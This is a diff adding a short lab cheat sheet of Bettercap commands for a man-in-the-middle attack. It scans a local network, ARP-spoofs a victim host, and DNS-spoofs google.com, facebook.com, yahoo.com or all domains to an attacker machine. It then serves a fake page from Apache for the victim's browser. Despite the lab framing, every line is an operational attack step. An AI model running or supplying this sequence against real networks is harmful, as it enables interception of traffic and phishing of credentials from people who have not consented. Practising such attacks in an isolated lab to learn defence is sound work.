@@ -1,0 +1,40 @@
+DNS Spoofing Lab Commands
+----------------------------
+
+# Pre-Setup
+sudo bettercap -iface eth0        # Start Bettercap on your network interface
+net.probe on                      # Scan for live hosts
+net.show                          # Display network hosts
+
+# ARP Spoofing
+set arp.spoof.targets 192.168.32.129   # Set victim IP for ARP spoofing
+arp.spoof on                           # Start ARP spoofing
+net.show                               # Verify spoofing status
+
+# DNS Spoof Module
+dns.spoof on                           # Enable DNS spoofing module
+
+# Configure DNS Spoof
+
+# Single domain spoofing
+set dns.spoof.domains google.com       # Domain to spoof
+set dns.spoof.address 192.168.32.136   # Redirect to attacker machine
+dns.spoof on
+
+# Multiple domains spoofing
+set dns.spoof.domains facebook.com,google.com,yahoo.com
+set dns.spoof.address 192.168.32.136
+dns.spoof on
+
+# Wildcard spoofing (all domains)
+set dns.spoof.domains *
+set dns.spoof.address 192.168.32.136
+dns.spoof on
+
+# Host fake webpage
+sudo nano /var/www/html/index.html     # Edit webpage content
+sudo service apache2 start             # Start Apache web server
+
+# Test on victim's browser
+http://google.com                      # Open spoofed site
+
